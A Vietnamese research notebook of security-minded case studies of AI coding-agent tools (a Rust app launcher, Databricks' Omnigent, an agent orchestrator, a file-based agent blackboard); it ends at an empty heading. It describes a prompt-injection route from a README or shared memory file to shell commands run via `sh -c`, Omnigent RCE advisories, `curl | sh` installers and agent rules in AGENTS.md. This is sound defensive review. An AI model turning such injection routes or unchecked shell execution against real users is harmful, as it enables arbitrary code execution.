- **Số dòng đo tốc độ sinh code, không đo chất lượng.** Cổng thật của một NLE là: CI chạy test trên PR, mở được trên máy phổ thông, import được project thật, export không treo. FilmCraft tự viết đúng các thiếu sót này trong ROADMAP — điểm cộng về trung thực, nhưng bài đăng viral thì bỏ qua.
- **Mẫu làm việc đáng ghi:** nhiều phiên Claude Code song song, mỗi phiên một git worktree (mục 03); plan riêng + ảnh chụp ứng dụng gốc làm spec; dùng công cụ trưởng thành (FFmpeg) làm oracle để kiểm codec tự viết — cùng ý với "test oracle" của ManimGX (mục 22 §9c).
- **Bối cảnh trình dựng video mở** (★ 12/10/2026): OpenCut 93,7k★ (đang viết lại lõi bằng Rust), LosslessCut 44,5k★, Shotcut 15,4k★, Olive 9,1k★, OpenShot 6,6k★, Kdenlive 5,8k★ (bản mirror GitHub).

## 3e. Case study: ArtCraft Launcher (`storytold/craft-launcher`) — trình cài đặt cho bộ Craft App Suite (link người dùng gửi, 2026-10-12)

> Tiếp nối §3d: cùng tác giả, cùng cách làm bằng agent, nhưng là phần mềm **cài phần mềm khác** nên câu hỏi chính là chuỗi tin cậy khi tải về. Đọc clone đầy đủ (99 commit, HEAD `1aaf7b2`) và mã ở `crates/core`, `crates/native`; nguồn ngoài tra cùng ngày.

### 3e.1 Hồ sơ nhanh

| Mục | Thông tin (12/10/2026) |
|---|---|
| Repo | `storytold/craft-launcher` · **~1,6k★**, 538 fork, 86 issue + 22 PR mở; tạo 9/10/2026; license **MIT OR Apache-2.0** (GitHub chỉ nhận ra Apache-2.0); logo/tên ArtCraft là thương hiệu, không theo MIT/Apache |
| Định vị | "One place to install, update and open every app in the Craft App Suite, rebuilt in pure Rust": cài, cập nhật, mở 12 app (PhotoCraft, FilmCraft, LightCraft, VectorCraft, PdfCraft, WordCraft, DeckCraft, GridCraft, CADCraft, SoundCraft…); **early alpha** |
| Tác giả | Brandon Thomas (`echelon`; bio: founder ArtCraft, Storyteller.ai, FakeYou) và org `storytold` ("ArtCraft", ~36,5k follower, 58 repo; PhotoCraft ~51k★ sau ~12 ngày). Pháp nhân trong MSI: Learning Machines LLC |
| Phát hành | 7 bản, v0.1.0 (10/10) → **v0.3.2** (11/10/2026); MSI x64/x86/arm64 + portable, DMG universal đã ký và notarize, AppImage/deb/rpm/flatpak/tar.gz (x86_64, aarch64, riscv64), FreeBSD, bản web WASM |
| Quy mô | ~22,8k dòng Rust, 308 `#[test]`; egui/eframe, không Electron/Tauri/webview; `unsafe_code = "forbid"`, clippy cấm `unwrap/expect/panic` ngoài test |
| Ai viết | 33 tên tác giả; **75/99 commit không phải merge (~76%) có trailer Claude đồng tác giả**. Commit đầu (`initial version`, 9/10 19:25) 12 dòng; 1 giờ 43 phút sau commit thứ hai thêm **136 file, 15.652 dòng** — cùng mẫu "chuẩn bị ngoài lịch sử công khai" như FilmCraft **(suy luận, chưa xác minh)** |

### 3e.2 Chuỗi tin cậy khi tải về, đối chiếu mã

| Lớp | Mã thật (`1aaf7b2`) | Nhận xét |
|---|---|---|
| Danh mục app | Cố định trong `core/src/catalog.rs`, mọi repo dạng `storytold/<app>` (có test khẳng định) | Không có cách thêm app ngoài qua cấu hình |
| Feed phiên bản | `GET https://api.storyteller.ai/v1/craft_apps/release_info` (server của công ty), rơi về GitHub releases khi cần. Từ **PR #208** (12/10, đóng issue #90): `repo_renames` từ feed chỉ được trỏ trong `storytold/`, link tải ngoài GitHub bị loại | Trước #208, feed có thể chuyển hướng một app sang repo của người khác (#90, rà tĩnh, chưa có khai thác) |
| Checksum | Mỗi file phải khớp SHA-256 (digest của feed/GitHub, hoặc dòng trong `SHA256SUMS.txt` của release); release **không có** checksum thì từ chối cài (#208); không tải được file SUMS là lỗi, không hạ cấp kiểm tra | Chống file hỏng/CDN sai, **không** chống kẻ chiếm được tài khoản phát hành: checksum nằm cùng chỗ với file |
| Chữ ký | **macOS:** `codesign --verify --deep -R` ghim Team ID `DJ6XS33FX8` (PR #51), chữ ký ad-hoc hoặc của dev khác bị từ chối. **Windows:** MSI được ký Authenticode lúc đóng gói (`packaging/windows/sign.ps1`), nhưng launcher **không kiểm** chữ ký trước khi chạy `msiexec`. **Linux/FreeBSD:** chỉ checksum | Chỉ macOS có xác thực nguồn gốc thật |
| Quyền | Linux/FreeBSD cài hệ thống qua `pkexec` (hộp mật khẩu polkit); MSI của launcher cài per-user, không UAC; không bao giờ thay app đang chạy | Không leo quyền ngầm; PR mở #68 (cài im lặng sau một lần hỏi), #209 (mở rộng quyền D-Bus Flatpak) sẽ đổi điều này |
| Quy tắc cho agent | `AGENTS.md` (PR #213, 12/10): **agent không bao giờ merge hay approve** thay đổi thêm app, nguồn tải hoặc đường cài cho repo ngoài `storytold/`; agent review chỉ được gắn cờ ở đầu review (chủ repo, tuổi, lịch sử, build có ký không) rồi dừng. Sinh ra sau PR #203 "MarkupCraft" từ tài khoản 5 ngày tuổi, build không ký | Cổng bằng văn xuôi, chưa có kiểm tra máy (CODEOWNERS, check CI chặn hàng mới trong catalog) |

### 3e.3 Đánh giá

- **Khác FilmCraft ở chỗ quan trọng:** CI chạy `fmt --check`, `clippy -D warnings`, `cargo test` trên Ubuntu + Windows và kiểm wasm cho **mọi PR** (FilmCraft §3d.3 không có cổng test). Quy tắc "never crash", "mọi thứ từ mạng là thù địch" (giới hạn kích thước, `get()` thay vì index) được ép bằng lint chứ không chỉ viết ra.
- **Điểm mạnh:** catalog đóng, checksum bắt buộc, ghim Team ID trên macOS, `AGENTS.md` ghi bẫy thực chiến cho agent chạy song song (mỗi agent một `CARGO_TARGET_DIR`, ghi `Cargo.toml` ra file tạm rồi `mv`). Mẫu "agent không được tự cấp quyền cho bên thứ ba" đáng chép cho mọi repo có catalog/marketplace (mục 12, mục 20).
- **Rủi ro:** (1) 3 ngày tuổi, ~76% commit do agent đồng tác giả, nhịp merge rất nhanh; (2) Windows/Linux chỉ có checksum cùng nguồn; nếu tài khoản GitHub hoặc `api.storyteller.ai` bị chiếm thì launcher cài theo; (3) nhiều PR mở mở rộng quyền (cài im lặng, store plugin #113, quản lý MCP server #133); (4) rủi ro pháp lý của cả bộ app ("clean-room" bản sao Adobe/Microsoft, trade dress) vẫn bỏ ngỏ theo báo chí; (5) repo/trang tải không chính thức (ví dụ `craftsuite.net` trên Show HN) dễ gây nhầm: chỉ tải từ release của `storytold/*`.
- **So sánh** (★ 12/10/2026): Obtainium 20,4k★ (Android, cài app bất kỳ từ GitHub/GitLab releases), StabilityMatrix 8,9k★ (quản lý UI Stable Diffusion), Pinokio 8,2k★ (cài app AI bằng script cộng đồng, bề mặt tin cậy rộng hơn nhiều), Gear Lever 2,3k★ (quản lý AppImage). License của bốn dự án này **(chưa xác minh trong đợt này)**. Gần nhất về mô hình là launcher một hãng đóng như Adobe Creative Cloud desktop, JetBrains Toolbox.
- **Tích hợp:** dùng làm **mẫu tham khảo** cho trình cập nhật đa nền tảng bằng Rust (`core` thuần, build được wasm; `native` tách riêng; fixture JSON release thật cho test chọn asset). Muốn tái dùng mã: MIT hoặc Apache-2.0 tuỳ chọn, nhưng **không** dùng logo/tên ArtCraft. Nếu cài app Craft bằng launcher trên Windows/Linux, kiểm thêm chữ ký MSI hoặc so `SHA256SUMS.txt` với một nguồn thứ hai.

## 3f. Case study: Omnigent — "meta-harness" của Databricks cho mọi coding agent (link người dùng gửi, 2026-10-12)

> Đọc clone đầy đủ (4.686 commit, HEAD `87f6f08`) và đối chiếu mã ở các điểm README chỉ tuyên bố: mặc định bind, auth, telemetry, policy, công cụ agent tự có. Nguồn ngoài tra cùng ngày.

### 3f.1 Hồ sơ nhanh

| Mục | Thông tin (12/10/2026) |
|---|---|
| Repo | `omnigent-ai/omnigent` · **~10,8k★**, 1,7k fork; ~700 issue mở, ~1,2k PR mở; tạo 11/6/2026; license **Apache-2.0** (đóng góp cần DCO, không CLA) |
| Định vị | "Open-source meta-harness": một lớp điều phối chung trên Claude Code, Codex, Cursor, OpenCode, Hermes, Pi, Devin, Kiro, Goose, Qwen, Kimi… và agent tự viết bằng YAML; trạng thái **alpha** |
| Chủ dự án | **Databricks** (PyPI: "Databricks, Inc."; bài ra mắt trên blog Databricks 13/6/2026 của Matei Zaharia, Kasey Uhlenhuth, Corey Zumar). Lõi commit là người MLflow (Pat Sukprasert, Serena Ruan, Tomu Hirata, Corey Zumar); trang chủ ghi thêm Neon. Bản managed "Omnigent on Databricks" đang Beta |
| Phát hành | PyPI `omnigent`, 40 phiên bản, ổn định mới nhất **v0.17.0** (5–6/10/2026), nightly `0.18.0.devYYYYMMDD`; Homebrew tap; app desktop macOS (Electron), app mobile; ~39k lượt tải PyPI/tháng (pypistats) |
| Quy mô | ~523k dòng Python trong `omnigent/` + web UI (pnpm), SDK, `deploy/` cho Docker, Render, Railway, Fly, Modal, Cloudflare, k8s, Databricks Apps; 2.230 file `test_*.py`; **114 file trong `.github/workflows/`** (CI, e2e, flake-stress, benchmark, scorecard, triage tự động) |
| Ai viết | 280 tên tác giả; **~90% commit có trailer `Co-authored-by: Isaac`** (`isaac@databricks.com`, coding agent nội bộ của Databricks **(suy từ email, chưa xác minh)**), 484 commit có trailer Claude, 398 của bot `omni-resolve-agent[bot]` (được `maintainer-approval.yml` coi là tác giả tin cậy) |

### 3f.2 Nó làm gì

- **Một server + nhiều mặt tiền:** `omnigent` mở phiên trong terminal và web UI tại `localhost:6767`; cùng phiên theo người dùng sang trình duyệt, điện thoại, app desktop. Lệnh `omnigent claude|codex|cursor|opencode|hermes|pi…` bọc CLI gốc trong tmux; harness "SDK" chạy qua `omnigent run agent.yaml`.
- **Trộn agent:** một phiên có thể có sub-agent khác hãng. Ví dụ đi kèm: **Polly** (tech lead không viết code, giao việc cho Claude Code/Codex/Pi trong git worktree song song, rồi gửi diff cho reviewer **khác hãng** với người viết), **Debby** (hai "đầu" Claude + GPT, `/debate`), **Deep Research**.
- **Cộng tác:** chia sẻ phiên (mặc định chỉ đọc), co-drive (lệnh của đồng đội chạy **trên máy bạn**), fork phiên sang máy khác.
- **Sandbox đám mây:** Modal, Daytona, E2B, Blaxel, CoreWeave, Kubernetes, NVIDIA OpenShell, microsandbox… hoặc server tự cấp sandbox mỗi phiên (*managed hosts*); trên máy local dùng `bwrap` (Linux, bắt buộc) hoặc `seatbelt` (macOS). Windows chỉ có Job Object: **không cô lập file/mạng**.
- **Policy:** ALLOW / DENY / ASK ở ba tầng (server → agent YAML → phiên), DENY ngắt sớm; builtin như hỏi trước lệnh shell, giới hạn số tool call, trần chi phí USD có ngưỡng cảnh báo; viết thêm bằng CEL hoặc hàm Python.

### 3f.3 Cổng thật, đối chiếu mã

| README / cảm nhận | Mã thật (`87f6f08`) | Nhận xét |
|---|---|---|
| Server local không cần đăng nhập | `--host` mặc định `127.0.0.1`; bind loopback → chế độ một người dùng không login; bind non-loopback mà không cấu hình auth → **tự bật accounts** và cảnh báo (`cli.py`) | Mặc định an toàn |
| "Mở IP LAN của máy trên điện thoại (`http://192.168.x.x:6767`)" | Với bind mặc định loopback, IP LAN không vào được; phải `--host 0.0.0.0`, lúc đó auth tự bật | README đơn giản hoá; không phải lỗ hổng |
| Deploy lên server rồi đăng nhập | `POST /setup` **không xác thực**: người đầu tiên mở URL tạo tài khoản admin (mô hình Immich/Jellyfin), sau đó trả 409 | Khoảng hở giữa lúc deploy và lúc admin tự claim; đặt sẵn `OMNIGENT_ACCOUNTS_INIT_ADMIN_PASSWORD` để đóng |
| "Nói với agent để thêm policy" | Agent luôn có `sys_add_policy` (chỉ **thêm**, không gỡ) và builtin `ask_on_add_policy` để bắt duyệt cả việc thêm | Thiết kế đúng hướng: agent chỉ siết được, không nới |
| (README không nói) | Agent **luôn** có 4 công cụ `sys_scheduled_task_*` để tự tạo/sửa/xoá tác vụ định kỳ, không cần spec bật | Agent tự lên lịch chạy lại chính nó → đáng gắn policy ASK cho các tool này (mục 21) |
| "Telemetry ẩn danh mặc định bật" | Hai hệ khác nhau: analytics sử dụng **bật** (tắt bằng `DO_NOT_TRACK=1`, `OMNIGENT_DISABLE_TELEMETRY=true`, `OMNIGENT_ANALYTICS=0` hoặc `telemetry: false`; tự tắt trong CI; cấu hình kéo từ `config.omnigent-telemetry.io`); tracing OpenTelemetry **tắt** trừ khi `OMNIGENT_TELEMETRY_ENABLED` | README đúng; tắt trước khi dùng trong môi trường nhạy cảm |
| Bảo mật | Trang advisories có **7 GHSA (3 critical, 4 high)**: ghi đè bundle chia sẻ → RCE trên runner, bộ phân tích lệnh shell fail-open (sửa ở #3559), thoát `os_env.cwd`, RCE qua policy YAML (6/2026 và 9/2026). CVE-2026-62674/75/76 (CVSS 9,0/8,8) gắn với đợt 6/2026 theo OpenCVE **(chưa xác minh)** | Điểm yếu lặp lại: bundle/agent chia sẻ và parser policy. Chỉ chạy bundle từ nguồn tin cậy; cập nhật thường xuyên |

### 3f.4 Đánh giá

- **Điểm mạnh:** đứng sau là một tổ chức lớn với nhịp phát hành hằng tuần; mặc định mạng và auth cẩn thận hơn phần lớn ADE trong §1.3; policy engine nhiều tầng có trần chi phí là thứ T3 Code, Vibe Kanban, Claude Squad không có; harness bench (`tests/harness_bench`) đo ma trận năng lực của từng harness thay vì tin tài liệu vendor; review chéo khác hãng (Polly) là mẫu đáng chép (mục 03).
- **Rủi ro:** (1) alpha, ~1,9k issue + PR mở, codebase rất lớn và phần lớn do agent viết → bề mặt tấn công rộng, 7 advisory trong 4 tháng; (2) co-drive và chia sẻ quyền Edit cho phép người khác chạy lệnh trên máy bạn; (3) Windows không có sandbox file/mạng; (4) analytics bật mặc định; (5) bản managed trên Databricks hẹp hơn bản mở (không policy Python, sandbox không dùng key model riêng) theo docs Databricks.
- **So với nhóm ADE (§1.3):** T3 Code, Vibe Kanban, Claude Squad là "bàn làm việc" cho một người; Omnigent là **server nhiều người dùng có governance**, gần một nền tảng hơn. OpenHands (~90,7k★, MIT) là agent riêng chứ không bọc agent khác; LangGraph (~43,1k★, MIT) là thư viện viết agent bằng code.
- **Tích hợp:** `uv tool install omnigent` (Python 3.12+), hoặc `brew install omnigent-ai/tap/omnigent`; tránh `curl … | sh` trên máy dùng chung. Cấu hình an toàn tối thiểu: giữ bind loopback, hoặc deploy với `OMNIGENT_ACCOUNTS_INIT_ADMIN_PASSWORD` + OIDC; bật `ask_on_os_tools` và `cost_budget` ở tầng server; thêm policy ASK cho `sys_scheduled_task_*`; đặt `DO_NOT_TRACK=1`; trên Linux cài `bubblewrap`. License Apache-2.0 nhúng được, giữ `NOTICE`.

## 3g. Case study: Open-Makers/ai-coding-agents-orchestrator, pipeline PM → Coder → QA → review chạy trên CLI agent có sẵn (link người dùng gửi, 2026-10-16)

**Kết luận:** thiết kế đáng học, chưa nên dùng cho dự án thật. Repo cá nhân, 5★, CHANGELOG ghi 0.9.0 (9/6/2026) nhưng release mới nhất trên GitHub chỉ là v0.7.0 (5/6/2026). Đáng học nhất là cách tách vai: **model chỉ sinh văn bản, orchestrator ghi file và chạy lệnh**. Điểm yếu lớn nhất: **lệnh test do LLM đề xuất được chạy thẳng bằng `sh -c`**, không allowlist, không sandbox.

### 3g.1 Hồ sơ nhanh (16/10/2026)

| Mục | Thông tin |
|---|---|
| Repo | `Open-Makers/ai-coding-agents-orchestrator` · 5★, 2 fork, 0 issue mở, 6 PR đã merge · MIT · Go 1.26 |
| Tác giả | Michal Zuchowski (GitHub `michal-zuchowski`, bio "It generalist"; email @openmakers.pl ở commit mới). Org `Open-Makers` không mô tả, không thành viên công khai; `openmakers.pl` chỉ là trang giữ chỗ |
| Lịch sử | 142 commit từ 9/2/2026. 10 commit có Copilot làm đồng tác giả, 7 commit có Claude. Khoảng lặng 11/6 → 4/10/2026; các commit gần nhất chỉ đụng tài liệu và CI |
| Phát hành | Tag v0.2.0, v0.3.0, v0.5.0, v0.7.0; **không có tag 0.9.0** dù CHANGELOG ghi "0.9.0 — 2026-06-09". Cài bằng `go install …@latest` sẽ lấy v0.7.0 |
| Quy mô | ~29,4k dòng Go (không tính test) + ~10,6k dòng test trong 76 file `_test.go`. CI chạy `go vet`, golangci-lint, test `-race`, nhưng cài công cụ bằng `@latest` (không ghim). Chưa xác minh được CI trên `main` đang xanh |

### 3g.2 Nó làm gì

1. Thu ngữ cảnh dự án và recall memory.
2. **PM** đàm phán `TaskSpec`. *Cổng người duyệt.*
3. PM chia việc thành sub-task, lưu dạng bead của `bd` để chạy tiếp được. Security và QA rà kế hoạch **trước** khi người duyệt `task_plan.md`. *Cổng người duyệt.*
4. Vòng tự động có trần số lượt:
   - QA viết test cho mọi sub-task trước (TDD).
   - Coder viết mã.
   - Chạy một vòng build/test/sửa chung.
   - QA, UX và Security review; PM phân xử. Lỗi phải sửa thành bead mới và vòng lặp chạy lại.
5. Viết tóm tắt và `nice_to_have.md`.

Runner: OpenCode (mặc định), Claude CLI, Codex CLI, Copilot CLI, cùng các server local tương thích OpenAI (Ollama, LM Studio, MLX). Mỗi agent dùng được model riêng. Có TUI Bubble Tea và chế độ headless.

Memory "kiểu OpenClaw":

- `.orchestrator/memory/MEMORY.md` được ghép vào đầu mọi prompt;
- log theo ngày, tóm tắt theo task;
- index bằng SQLite FTS5/BM25, embedder tùy chọn.

### 3g.3 Đọc mã: điểm tốt

- **Model không tự cầm công cụ.** Runner Claude gọi `claude … --allowedTools ""` (`internal/runner/claude.go:70`). Coder chỉ in code fence, orchestrator tự tách và ghi file (`internal/agent/coder.go` `streamAndWriteFiles`). Model không tự ý chạy lệnh giữa chừng.
- **Đường ghi file có chặn:**
  - `sanitizeFilePath` từ chối `..` và bỏ tiền tố tuyệt đối;
  - Coder bị cấm ghi `*_test.go` ("tester owns test files") để không tự sửa test cho xanh;
  - đọc và sửa phụ dùng `os.Root` (`internal/safefile`).
- **Kế hoạch được rà trước khi người duyệt.** Security và QA đọc kế hoạch trước cổng duyệt, nên người duyệt thấy rủi ro ngay từ đầu.
- **Tách đánh giá khỏi người viết.** QA viết test, Coder viết mã, PM phân xử. Lỗi phải sửa thành bead, việc nên làm để sau.
- `AGENTS.md` của repo cấm agent tự `git commit`/`push`. Repo cũng phân vai model: model lớn chỉ thiết kế, review, kiểm tra; model vừa làm việc tay.

### 3g.4 Đọc mã: rủi ro

| Rủi ro | Bằng chứng | Hệ quả |
|---|---|---|
| **Lệnh do LLM sinh được chạy bằng shell** | Coder/QA ghi mục `TEST_CMDS` vào `test_cmds` (`coder.go:163`, `qa.go:366`). `executil.Run` chạy `sh -c <lệnh>` (`internal/executil/executil.go:51`). `Sanitize` chỉ chặn chuỗi rỗng, xuống dòng và ký tự điều khiển; bộ lọc khác chỉ bỏ lệnh build và lệnh tương tác | `;`, `&&`, `\| sh`, `curl …` đều lọt. README dự án có thể chứa prompt injection, và MEMORY.md được ghép vào mọi prompt, nên từ đó có thể đi tới chạy lệnh tuỳ ý với quyền người dùng |
| Runner Codex/Copilot được cấp quyền rộng | `codex exec --full-auto` (`codex.go:138`), `copilot -p … --allow-all-tools` (`copilot.go:222`) | Khác runner Claude, hai CLI này tự chạy công cụ. Với Copilot, đó là mọi công cụ |
| Đích ghi file không bị giới hạn | `writeOneFile` dùng `os.WriteFile` (theo symlink) và chỉ chặn `..` | Coder ghi được `.git/hooks/pre-commit`, `.github/workflows/*`, `.orchestrator/memory/MEMORY.md` |
| Không sandbox | Mọi thứ chạy trực tiếp trên máy, cùng quyền người dùng | Phải tự bọc bằng container, VM hoặc sandbox |
| Phát hành lệch tài liệu | 0.9.0 chỉ có trong CHANGELOG, không có tag | Người cài không biết mình đang dùng bản nào |

**Chưa tự chạy:** chưa build và chưa chạy test của repo, vì bộ phân loại quyền của phiên chặn chạy mã bên ngoài (lần trước với AnyJev). Các nhận xét ở trên dựa trên đọc mã tĩnh ở HEAD `1c1185c`.

### 3g.5 So với công cụ cùng loại (trang GitHub, 16/10/2026)

| Công cụ | ★ · license | Khác biệt | Lưu ý |
|---|---|---|---|
| `ComposioHQ/agent-orchestrator` | ~13,3k · Apache-2.0 | Giám sát đội agent từ plan tới merge | Có telemetry "limited usage", tắt được |
| `gastownhall/gastown` (trước là steveyegge) | ~18,4k · MIT | Quản lý workspace nhiều agent, đi cùng beads | `main` im từ 23/7/2026; OpenTelemetry |
| `gastownhall/beads` (`bd`) | ~28k · MIT | Issue tracker dạng đồ thị cho agent, chạy trên Dolt; orchestrator này dùng nó để chạy tiếp được | Cài bằng `curl \| bash` (README nói có kiểm checksum) |
| `ruvnet/ruflo` (claude-flow) | ~75,6k · MIT | Swarm cho Claude Code (mục 02) | Nhiều tuyên bố hiệu năng chưa kiểm chứng |
| `bmad-code-org/BMAD-METHOD` | ~54,2k · MIT | Phương pháp nhiều vai (PM, kiến trúc, dev, QA) bằng prompt | Không phải runtime |
| MetaGPT / ChatDev | ~70,9k MIT / ~34,5k Apache-2.0 | "Công ty phần mềm" nhiều vai, đời 2023–24 | MetaGPT release cuối 3/2025 |
| `smtg-ai/claude-squad` | ~8,6k · **AGPL-3.0** | TUI tmux + worktree, không có pipeline vai | Mục 01 §1 |
| `BloopAI/vibe-kanban` · `stravu/crystal` | ~28,4k · ~3,1k | Kanban/worktree song song | **Sunsetting** · **deprecated** (thay bằng Nimbalyst) |

**Khi nào dùng:** thử nghiệm quy trình có vai trên dự án Go nhỏ, chạy trong container dùng một lần, với runner Claude (không công cụ) hoặc model local. Nên ghim commit thay vì `@latest`.

**Không nên dùng:** repo có secret, máy cá nhân không có sandbox, hoặc khi cần một công cụ được bảo trì đều.

**Bài học cho khung của chủ kho (X-Templates):**

- **Model chỉ sinh văn bản, harness mới hành động** là một hàng rào mạnh hơn hook chặn từng lệnh.
- Ngược lại, **lệnh mà LLM đề xuất phải đi qua cùng guard với lệnh của agent**. Đó là lỗ hổng chính ở đây, và cũng là lý do X-Templates đọc Gate từ PLAN chứ không lấy lệnh do model tự khai.

**Nguồn §3g:** https://github.com/Open-Makers/ai-coding-agents-orchestrator (clone 16/10/2026, HEAD `1c1185c`; đọc README.md, CHANGELOG.md, AGENTS.md, `.github/workflows/ci.yml`, `internal/runner/{claude,codex,copilot,opencode}.go`, `internal/agent/{coder,qa,helpers}.go`, `internal/executil/executil.go`, `internal/safefile`) · …/releases.atom · `git ls-remote --tags` · https://github.com/Open-Makers · https://github.com/michal-zuchowski · https://github.com/gastownhall/beads · https://gascity.com/about/ · https://docs.openclaw.ai/concepts/memory · https://github.com/ComposioHQ/agent-orchestrator · https://github.com/gastownhall/gastown · https://github.com/ruvnet/ruflo · https://github.com/bmad-code-org/BMAD-METHOD · https://github.com/FoundationAgents/MetaGPT · https://github.com/OpenBMB/ChatDev · https://github.com/smtg-ai/claude-squad · https://github.com/BloopAI/vibe-kanban · https://github.com/stravu/crystal

## 3h. Case study: Manto-X/Agent_Board — blackboard file + "gậy tiếp sức" cho Claude/Codex/Antigravity desktop (link người dùng gửi, clone 2026-10-17)

**Kết luận:** mẫu điều phối tối giản, trung thực về phạm vi — nhưng "khoá chống đè" chỉ là **quy ước**, không phải lock thật, và installer là `curl | python3`. Khác §3g ở chỗ Agent Board **không tự chạy lệnh hộ**: nó chỉ là trạng thái chung + giao thức bàn giao mà mỗi agent chat desktop (vẫn do người mồi prompt) tự đọc và tuân theo. Bề mặt tấn công nhỏ hơn §3g nhiều (không có `sh -c` lệnh LLM), đổi lại **không có tự động hoá thật**. Tác giả người Việt, README song ngữ VN-trước (xem thêm [mục 18](../18-vietnam-community/README.md)).

### 3h.1 Hồ sơ nhanh (17/10/2026)

| Mục | Thông tin |
|---|---|
| Repo | `Manto-X/Agent_Board` · MIT (© "Manto X" 2026) · 100% Python standard library, không phụ thuộc ngoài |
| Tác giả | `Manto-X` (GitHub); README song ngữ Việt–Anh, giọng Việt-trước |
| Lịch sử | **Mới tinh**: HEAD `192a378` ngày 17/10/2026 (đúng ngày đọc); clone nông thấy 1 commit, số commit đầy đủ chưa rõ. Không có thư mục `.github/`/CI |
| ★ / cộng đồng | **Chưa có số liệu** — WebSearch 17/10/2026 không ra kết quả nào về repo này (quá mới / ít tiếng); mọi con số **(chưa xác minh)** |
| Làm gì | "Zero-API, File-Based Multi-Agent Blackboard with Relay Baton Protocol": điều phối Claude Code / Codex / Antigravity qua **hệ thống file cục bộ**, không gọi API trả phí |

### 3h.2 Nó làm gì (đối chiếu mã, không chỉ README)

- **Bảng Kanban = thư mục.** `.agents/00_specs → 01_backlog → 02_in_progress → 03_review → 04_done → 05_escalation`; mỗi task là một file `.md` có frontmatter (`id`, `stage`, `assignee`, `reject_count`, `max_rejections`…). `task move/create/reject/list` đọc-ghi các file này (`task.py`).
- **Gậy tiếp sức `BATON.json`.** Một file JSON giữ `holder` (orchestrator/mason/reviewer), `task_id`, `action`. Quy ước: chỉ agent đang giữ gậy mới được thao tác (`AGENTS.md` ghi rõ "không bắt đầu code nếu `holder != mason`").
- **Phân vai động.** `project_config.json` map 3 vai → 3 nền tảng (mặc định orchestrator=antigravity, mason=claude, reviewer=codex); đổi bằng một lệnh `roster`. Mỗi agent đọc vai của mình từ `CLAUDE.md`/`CODEX.md`/`AGENTS.md`.
- **Cầu chì 2 hiệp (có thật).** `reject_task`: `reject_count` tăng mỗi lần từ chối; đạt `max_rejections` (mặc định 2) → chuyển task sang `05_escalation` và trả gậy về orchestrator để phân xử. Mức `NITPICK` chỉ ghi chú, **không** tính là từ chối (`task.py`). 6/6 unit test (`unittest`) pass khi tự chạy: baton flow, circuit breaker, nitpick, lifecycle, dynamic role, init.
- **Ghi file nguyên tử.** Cả `BATON.json`, `project_config.json` và file task đều ghi ra `.tmp` rồi `os.replace` → không để lại file ghi dở.

### 3h.3 Đọc cổng thật (điều README không nói)

| Điểm | Mức | Chi tiết |
|---|---|---|
| **"Gậy" là quy ước, không phải lock** | ⚠️ | `baton acquire`/`pass` **ghi đè `BATON.json` vô điều kiện** — không kiểm holder hiện tại, không PID/chủ sở hữu, `expires_at` được ghi nhưng **không bao giờ enforce** (`baton.py`). Nên "triệt tiêu race condition / strict single-holder lock" chỉ đúng khi *mọi* agent tự nguyện chạy CLI và tôn trọng gậy. Không có gì chặn hai process sửa cùng file nguồn đồng thời; thứ được bảo vệ nguyên tử chỉ là bản thân `BATON.json`. Đây là **điều phối lượt chơi**, không phải khoá file cấp OS hay git worktree |
| **Installer `curl \| python3`** | ⚠️ | `get_board.py` tải `main.zip` từ chính repo, chỉ giải nén `.agents/` + 4 file guide, **không đè README** dự án — minh bạch và hợp lý. Nhưng pipe mã từ xa vào `python` là pattern kho luôn cảnh báo (§3e, §3f, mục 12). Script tự nêu fallback `git clone` an toàn hơn — nên dùng cách đó |
| **"$0 phí" phụ thuộc điều khoản** | ⚠️ | "Dùng 100% gói desktop phẳng" nghĩa là *không tốn API đo token*, **không** phải vô hạn: lái agent coding tự động bằng gói thuê bao chat có thể đụng giới hạn dùng hoặc điều khoản của từng hãng |
| Không tự chạy lệnh hộ | ✅ | Khác §3g, không có chỗ nào `sh -c` lệnh do LLM sinh. Toàn bộ "tự động" vẫn cần người bảo mỗi agent "đọc board, làm, chuyển gậy" → an toàn hơn nhưng không phải autonomous thật |
| Gọn, không xâm lấn | ✅ | Mọi thứ nằm trong `.agents/`; chỉ thêm 4 file guide ở gốc, không đụng mã dự án |

### 3h.4 So với §3g và cùng nhóm

- **vs §3g `ai-coding-agents-orchestrator`:** §3g là **runtime Go tự chạy** (runner gọi CLI, chạy build/test — kèm lỗ chạy lệnh LLM qua `sh -c`). Agent Board là **giao thức + trạng thái file thuần**, không runtime, không chạy lệnh → ít rủi ro hơn hẳn nhưng cũng không tự động hoá vòng lặp; người vẫn là bộ điều phối giữa các tab AI.
- **vs claude-squad / vibe-kanban / crystal (§3g bảng):** nhóm kia dùng tmux + git worktree để chạy nhiều agent song song *thật*; Agent Board cố tình tránh worktree, đổi lấy "zero-install" nhưng vì thế không có cô lập nhánh — hai agent vẫn ghi chung một cây làm việc.
- **vs BMAD-METHOD:** cùng ý "nhiều vai PM/dev/QA", nhưng BMAD là prompt method; Agent Board thêm được trạng thái file + cầu chì kiểm đếm được.

**Khi nào dùng:** muốn thử quy trình orchestrator→mason→reviewer giữa các trợ lý chat desktop mà không dựng API/daemon; dự án nhỏ, một người ngồi giám sát. **Không nên coi là** khoá chống đè khi nhiều process thật ghi song song (dùng worktree/lock thật), và nên cài bằng `git clone` thay vì `curl | python3`.

**Bài học cho kho:** (1) "blackboard thư mục + 1 file trạng thái ghi nguyên tử" là mẫu điều phối tối giản, zero-dep đáng tái dùng khi không muốn hạ tầng; (2) nhưng phải **ghi rõ nó là quy ước, không phải lock** — đúng kiểu cảnh báo kho đã rút ở mục 12 §4 (allowlist/parser chạy sai lớp); (3) cầu chì đếm-từ-chối-rồi-escalate là cách chặn ping-pong rẻ và kiểm được bằng test; (4) lại một lần nữa: `curl | python` nên đổi thành clone.

**Nguồn §3h:** https://github.com/Manto-X/Agent_Board (clone 2026-10-17, HEAD `192a378`; đọc README.md, AGENTS.md, CLAUDE.md, CODEX.md, MANUAL.md, LICENSE, get_board.py, `.agents/board.py`, `.agents/scripts/{baton,task,config,init,roster,watcher}.py`, `.agents/project_config.json`, `.agents/BATON.json`, `docs/`; tự chạy `unittest` 6/6 pass) · WebSearch 2026-10-17 (không có kết quả về repo)

## 3i. Nâng cấp 31/10/2026: rà repo lớn

